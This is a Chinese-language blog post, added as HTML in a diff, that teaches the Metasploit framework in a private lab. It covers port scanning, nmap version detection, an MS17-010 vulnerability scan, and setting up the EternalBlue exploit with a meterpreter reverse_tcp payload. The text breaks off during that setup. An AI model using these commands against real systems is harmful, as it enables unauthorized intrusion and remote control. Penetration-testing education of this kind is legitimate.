@@ -199,6 +199,542 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/27/Metasploit-framework-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/27/Metasploit-framework-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">Metasploit framework 使用教程</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-27 13:23:47" itemprop="dateCreated datePublished" datetime="2022-11-27T13:23:47+08:00">2022-11-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-28 01:39:25" itemprop="dateModified" datetime="2022-11-28T01:39:25+08:00">2022-11-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><p>Metasploit framework （MSF）是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit 可以用于信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。</p>
+<h1 id="二：模块功能"><a href="#二：模块功能" class="headerlink" title="二：模块功能"></a>二：模块功能</h1><h2 id="2-1-启动"><a href="#2-1-启动" class="headerlink" title="2.1 启动"></a>2.1 启动</h2><p>漏洞利用工具集中打开；</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用命令行打开</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">       =[ metasploit v6.2.9-dev                           ]</span><br><span class="line">+ -- --=[ 2230 exploits - 1177 auxiliary - 398 post       ]</span><br><span class="line">+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: When in a module, use back to go </span><br><span class="line">back to the top level prompt</span><br></pre></td></tr></table></figure>
+
+<p>这里一共提供了7个种类的模块，功能如下：</p>
+<ul>
+<li>exploits：漏洞渗透模块，我们在发现漏洞之后，就可以使用这类模块实现快速渗透。根据漏洞或者系统名称，可以搜索出对应的漏洞模块，然后使用模块，设置几个简单的参数，然后再执行运用这个模块，完成入侵。</li>
+<li>auxiliary：辅助模块，用于信息收集，使用此类模块就可以完成信息收集的任务。</li>
+<li>post：后渗透攻击模块，当我们拿到目标系统的控制权限之后，为了绕开系统的保护机制，我们可以使用此类模块。它可以帮助我们提高控制权限，进而获取敏感信息和实施跳板攻击。</li>
+<li>payload：攻击载荷模块，通过它我们可以实现对目标的远程控制。</li>
+</ul>
+<h2 id="2-2-信息收集"><a href="#2-2-信息收集" class="headerlink" title="2.2 信息收集"></a>2.2 信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 msf 的扫描模块，可以查看大量的扫描模块</span> </span><br><span class="line">msf6 &gt; search scanner</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash">   Name                                                                     Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -    ----                                                                     ---------------  ----    -----  -----------</span><br><span class="line">   0    auxiliary/scanner/http/a10networks_ax_directory_traversal                2014-01-28       normal  No     A10 Networks AX Loadbalancer Directory Traversal</span><br><span class="line">   1    auxiliary/scanner/snmp/aix_version                                                        normal  No     AIX SNMP Scanner Auxiliary Module</span><br><span class="line">   2    auxiliary/scanner/discovery/arp_sweep                                                     normal  No     ARP Sweep Local Network Discovery</span><br><span class="line">...</span><br><span class="line">   614  auxiliary/scanner/rservices/rexec_login                                                   normal  No     rexec Authentication Scanner</span><br><span class="line">   615  auxiliary/scanner/rservices/rlogin_login                                                  normal  No     rlogin Authentication Scanner</span><br><span class="line">   616  auxiliary/scanner/rservices/rsh_login                                                     normal  No     rsh Authentication Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 616, use 616 or use auxiliary/scanner/rservices/rsh_login</span><br><span class="line">通过名称或者索引与模块交互。例如: info 616, use 616 或者 use auxiliary/scanner/rservices/rsh_login</span><br></pre></td></tr></table></figure>
+
+<h3 id="（1）以-syn-扫描模块为例"><a href="#（1）以-syn-扫描模块为例" class="headerlink" title="（1）以 syn 扫描模块为例"></a>（1）以 syn 扫描模块为例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 syn 模块</span></span><br><span class="line">msf6 &gt; use auxiliary/scanner/portscan/syn 	</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示参数</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/syn):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   BATCHSIZE  256              yes       The number of hosts to scan per set</span><br><span class="line">   DELAY      0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   INTERFACE                   no        The name of the interface</span><br><span class="line">   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   SNAPLEN    65535            yes       The number of bytes to capture</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT    500              yes       The reply read timeout in milliseconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置目标主机 IP</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set RHOSTS 192.168.80.1</span><br><span class="line">RHOSTS =&gt; 192.168.80.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置线程数</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set THREADS 40</span><br><span class="line">THREADS =&gt; 40</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次查看设置参数</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/syn):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   BATCHSIZE  256              yes       The number of hosts to scan per set</span><br><span class="line">   DELAY      0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   INTERFACE                   no        The name of the interface</span><br><span class="line">   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS     192.168.80.1     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   SNAPLEN    65535            yes       The number of bytes to capture</span><br><span class="line">   THREADS    40               yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT    500              yes       The reply read timeout in milliseconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动信息收集</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; run</span><br><span class="line"> </span><br><span class="line">[+]  TCP OPEN 192.168.80.1:135</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:139</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:443</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:445</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:1433</span><br><span class="line">[+]  TCP OPEN 192.168.80.1:3306</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）使用-nmap-扫描"><a href="#（2）使用-nmap-扫描" class="headerlink" title="（2）使用 nmap 扫描"></a>（2）使用 nmap 扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-vV：进行版本探测</span></span><br><span class="line">msf6 &gt; nmap -sV 192.168.80.1</span><br><span class="line">[*] exec: nmap -sV 192.168.80.1</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 15:10 CST</span><br><span class="line">Nmap scan report for localhost (192.168.80.1)</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Not shown: 994 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http      Apache httpd</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2095</span><br><span class="line">3306/tcp open  mysql         MySQL 5.7.31-log</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">已执行服务检测。请向 https://nmap.org/submit/ 报告任何不正常的结果。</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.86 seconds</span><br><span class="line">Nmap完成：在 17.86 秒内扫描了1个 IP 地址。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-尝试攻击"><a href="#2-3-尝试攻击" class="headerlink" title="2.3 尝试攻击"></a>2.3 尝试攻击</h2><h2 id="Metasploit-中常见-payload"><a href="#Metasploit-中常见-payload" class="headerlink" title="Metasploit 中常见 payload"></a>Metasploit 中常见 payload</h2><h3 id="（1）连接方式"><a href="#（1）连接方式" class="headerlink" title="（1）连接方式"></a>（1）连接方式</h3><ul>
+<li>windows&#x2F;meterpreter&#x2F;bind_tcp					# 正向连接</li>
+<li>windows&#x2F;meterpreter&#x2F;reverse_tcp              # 反向连接，常用</li>
+<li>windows&#x2F;meterperter&#x2F;reverse_http             # 通过监听80端口的反向连接</li>
+<li>windows&#x2F;meterperter&#x2F;reverse_https           # 通过监听443端口的反向连接</li>
+</ul>
+<h3 id="（2）使用场景"><a href="#（2）使用场景" class="headerlink" title="（2）使用场景"></a>（2）使用场景</h3><ul>
+<li>正向连接：我们攻击主机在内网，而目标主机在外网。目标主机无法和我们建立主动连接，而且大多数真是环境下目标主机防火墙只会允许我们访问少量的端口。如80端口，而80端口的访问量很多，所以也就可能导致连接失败的可能。</li>
+<li>反向连接：我们的攻击机和目标主机同时在外网或者内网，这样目标主机可以和我们建立主动连接，而且即使有防火墙也没关系，反向连接是用的比较多的一种。</li>
+<li>反向连接80和反向连接443端口：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或者443端口与外部通信。</li>
+</ul>
+<h3 id="（3）查看漏洞模块"><a href="#（3）查看漏洞模块" class="headerlink" title="（3）查看漏洞模块"></a>（3）查看漏洞模块</h3><p>exploit：攻击模块</p>
+<p>auxiliary：辅助模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看漏洞模块</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; search ms17-010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash"> Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br></pre></td></tr></table></figure>
+
+<h3 id="（4）使用辅助扫描模块测试"><a href="#（4）使用辅助扫描模块测试" class="headerlink" title="（4）使用辅助扫描模块测试"></a>（4）使用辅助扫描模块测试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用辅助扫描模式进行探测</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示参数信息</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                    Required  Description</span><br><span class="line">   ----         ---------------                                    --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                               no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                               no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                              no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/na  yes       List of named pipes to check</span><br><span class="line">                med_pipes.txt</span><br><span class="line">   RHOSTS                                                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo</span><br><span class="line">                                                                             it</span><br><span class="line">   RPORT        445                                                yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                  no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                         no        The password for the specified username</span><br><span class="line">   SMBUser                                                         no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                  yes       The number of concurrent threads (max one per host)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置目标主机IP</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOSTS 192.168.80.1</span><br><span class="line">RHOSTS =&gt; 192.168.80.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认参数信息</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                    Required  Description</span><br><span class="line">   ----         ---------------                                    --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                               no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                               no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                              no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/na  yes       List of named pipes to check</span><br><span class="line">                med_pipes.txt</span><br><span class="line">   RHOSTS       192.168.80.1                                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo</span><br><span class="line">                                                                             it</span><br><span class="line">   RPORT        445                                                yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                  no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                         no        The password for the specified username</span><br><span class="line">   SMBUser                                                         no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                  yes       The number of concurrent threads (max one per host)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行探测（目标主机 windows11 ）</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 192.168.80.1:445      - An SMB Login Error occurred while connecting to the IPC$ tree.</span><br><span class="line">[*] 192.168.80.1:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行探测（目标主机 windows7）</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.80.130:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.80.130:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<h3 id="（5）实施攻击"><a href="#（5）实施攻击" class="headerlink" title="（5）实施攻击"></a>（5）实施攻击</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择攻击模块</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置 payload 连接方式</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可使用 show payloads 查看适合要攻击的目标主机的payload</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出当前模块所需要配置的参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Win</span><br><span class="line">                                             dows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Wi</span><br><span class="line">                                             ndows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.80.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置目标主机</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.80.130</span><br><span class="line">RHOSTS =&gt; 192.168.80.130</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认攻击参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.80.130   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             